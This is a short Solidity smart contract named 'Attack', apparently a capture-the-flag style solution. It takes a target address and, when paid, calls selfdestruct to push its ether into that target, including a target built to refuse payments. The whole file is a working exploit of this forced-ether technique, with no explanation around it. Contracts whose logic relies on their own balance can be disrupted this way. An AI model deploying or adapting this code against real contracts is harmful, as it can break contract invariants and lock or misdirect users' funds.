// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public target; 

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        require(msg.value > 0);
        address payable targetAddress = payable(address(target));
        selfdestruct(targetAddress);
    }
}
